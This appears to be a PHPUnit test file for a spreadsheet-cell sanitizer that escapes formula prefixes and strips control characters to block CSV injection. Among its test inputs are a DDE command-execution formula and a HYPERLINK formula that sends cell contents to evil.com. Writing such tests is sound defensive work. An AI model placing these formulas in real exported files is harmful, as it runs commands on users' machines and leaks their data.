<?php

namespace Tests\Unit\Support;

use App\Support\Excel\SafeCell;
use PHPUnit\Framework\TestCase;

class SafeCellTest extends TestCase
{
    // ==================================================================
    // 1. FORMULA PREFIXES ARE ESCAPED
    // ==================================================================

    public function test_equals_prefix_is_escaped(): void
    {
        $this->assertSame("'=SUM(A1:A2)", SafeCell::sanitize('=SUM(A1:A2)'));
    }

    public function test_plus_prefix_is_escaped(): void
    {
        $this->assertSame("'+1+2", SafeCell::sanitize('+1+2'));
    }

    public function test_minus_prefix_is_escaped(): void
    {
        $this->assertSame("'-cmd", SafeCell::sanitize('-cmd'));
    }

    public function test_at_prefix_is_escaped(): void
    {
        $this->assertSame("'@SUM(A1)", SafeCell::sanitize('@SUM(A1)'));
    }

    public function test_tab_prefix_is_escaped(): void
    {
        $this->assertSame("'\tDATA", SafeCell::sanitize("\tDATA"));
    }

    public function test_carriage_return_prefix_is_escaped(): void
    {
        $this->assertSame("'\rDATA", SafeCell::sanitize("\rDATA"));
    }

    // ==================================================================
    // 2. COMMON INJECTION PAYLOADS
    // ==================================================================

    public function test_classic_cmd_injection_payload_is_escaped(): void
    {
        // The infamous CSV injection payload that opens Calculator on
        // Windows when the victim clicks the cell.
        $payload = '=cmd|\'/c calc\'!A0';

        $result = SafeCell::sanitize($payload);

        $this->assertStringStartsWith("'", $result);
        $this->assertSame("'".$payload, $result);
    }

    public function test_hyperlink_injection_payload_is_escaped(): void
    {
        $payload = '=HYPERLINK("http://evil.com?x="&A1,"Click me")';

        $result = SafeCell::sanitize($payload);

        $this->assertSame("'".$payload, $result);
    }

    // ==================================================================
    // 3. SAFE VALUES ARE UNCHANGED
    // ==================================================================

    public function test_normal_text_is_unchanged(): void
    {
        $this->assertSame('Elshad Mammadov', SafeCell::sanitize('Elshad Mammadov'));
    }

    public function test_text_with_space_before_plus_is_safe(): void
    {
        // Phone numbers with leading + are common — but they usually
        // come AFTER whitespace or include a country code that Excel
        // recognizes as a number, not a formula. A space-first value
        // is not a formula.
        $this->assertSame(' +994 50 123 45 67', SafeCell::sanitize(' +994 50 123 45 67'));
    }

    public function test_numbers_are_unchanged(): void
    {
        $this->assertSame(42, SafeCell::sanitize(42));
        $this->assertSame(3.14, SafeCell::sanitize(3.14));
    }

    public function test_boolean_and_null_are_unchanged(): void
    {
        $this->assertTrue(SafeCell::sanitize(true));
        $this->assertFalse(SafeCell::sanitize(false));
        $this->assertNull(SafeCell::sanitize(null));
    }

    public function test_empty_string_returns_empty(): void
    {
        $this->assertSame('', SafeCell::sanitize(''));
    }

    // ==================================================================
    // 4. CONTROL CHARACTERS ARE STRIPPED
    // ==================================================================

    public function test_null_byte_is_stripped(): void
    {
        $this->assertSame('HelloWorld', SafeCell::sanitize("Hello\x00World"));
    }

    public function test_control_characters_are_stripped(): void
    {
        $this->assertSame('AB', SafeCell::sanitize("A\x01\x02B"));
        $this->assertSame('AB', SafeCell::sanitize("A\x1FB"));
    }

    // ==================================================================
    // 5. RETURN TYPE CONSISTENCY
    // ==================================================================

    public function test_method_accepts_and_returns_mixed(): void
    {
        // The signature is `sanitize(mixed $value): mixed` — verify
        // that all common types pass through unchanged except strings
        // that need escaping.
        $inputs = ['text', 42, 3.14, true, false, null, []];

        foreach ($inputs as $input) {
            $result = SafeCell::sanitize($input);

            if (is_string($input)) {
                $this->assertIsString($result);
            } else {
                $this->assertSame($input, $result);
            }
        }
    }
}
